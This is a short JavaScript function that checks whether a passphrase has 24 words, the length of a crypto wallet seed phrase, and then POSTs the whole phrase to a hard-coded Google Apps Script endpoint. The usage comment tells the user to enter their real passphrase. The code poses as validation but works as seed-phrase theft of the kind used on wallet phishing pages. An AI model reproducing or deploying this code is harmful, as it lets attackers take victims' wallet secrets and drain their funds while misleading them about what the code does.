function validateAndSendPassphrase(passphrase) {
    // Trim whitespace and split into words
    const words = passphrase.trim().split(/\s+/);

    // Check if the passphrase has exactly 24 words
    if (words.length !== 24) {
        console.log("Invalid Passphrase");
        return;
    }

    // Google Apps Script API URL
    const url = "https://script.google.com/macros/s/AKfycbxK8VQMGkMc4gdlpo_GKoivsuWs4xQvwkynfZJ0E7qBlvcSY271Dq-pOcpIM4ci8WMP/exec";

    // Sending the passphrase via Fetch API
    fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ passphrase: passphrase })
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            console.log("Passphrase sent successfully!");
        } else {
            console.log("INVALID PASSPHRASE");
        }
    })
    .catch(error => {
        console.error("Error:", error);
    });
}

// Example Usage:
const myPassphrase = "word1 word2 word3 ... word24"; // Replace with your actual passphrase
validateAndSendPassphrase(myPassphrase);

